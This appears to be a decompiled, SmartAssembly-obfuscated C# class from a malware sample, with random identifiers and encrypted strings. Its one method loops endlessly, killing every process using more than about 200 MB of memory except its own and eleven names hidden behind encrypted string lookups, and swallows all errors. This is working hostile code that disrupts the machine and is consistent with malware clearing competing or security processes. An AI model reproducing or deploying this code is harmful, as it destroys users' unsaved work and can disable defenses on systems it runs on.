using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

public static class GpMDpSnRTzJaFT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void PhOhDruvDTBe()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107398470)) && !process.ProcessName.Contains(getString_0(107398493)) && !process.ProcessName.Contains(getString_0(107398484)) && !process.ProcessName.Contains(getString_0(107398443)) && !process.ProcessName.Contains(getString_0(107398462)) && !process.ProcessName.Contains(getString_0(107398417)) && !process.ProcessName.Contains(getString_0(107398404)) && !process.ProcessName.Contains(getString_0(107398423)) && !process.ProcessName.Contains(getString_0(107398890)) && !process.ProcessName.Contains(getString_0(107398909)) && !process.ProcessName.Contains(getString_0(107398856)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static GpMDpSnRTzJaFT()
	{
		Strings.CreateGetStringDelegate(typeof(GpMDpSnRTzJaFT));
	}
}
